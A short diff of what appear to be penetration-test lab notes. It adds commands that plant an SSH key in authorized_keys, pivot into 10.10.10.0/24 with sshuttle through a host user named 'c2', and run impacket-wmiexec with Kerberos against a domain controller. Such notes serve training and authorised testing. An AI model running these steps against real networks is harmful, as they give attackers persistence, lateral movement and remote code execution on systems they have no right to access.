@@ -88,5 +88,7 @@ mkdir CA
 ssh-keygen -f id_rsa -t rsa -N ''
 cat id_rsa.pub >> authorized_keys
 cat id_rsa.pub >> ~/.ssh/authorized_keys
-proxychains sshuttle -v -e "ssh -i /home/kali/Desktop/CA/id_rsa" -r john@192.168.199.100 10.10.10.0/24
+sshuttle -v -e "ssh -i /home/kali/Desktop/CA/id_rsa" -r c2@192.168.199.106 10.10.10.0/24
+/usr/bin/impacket-wmiexec -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
+
 ```
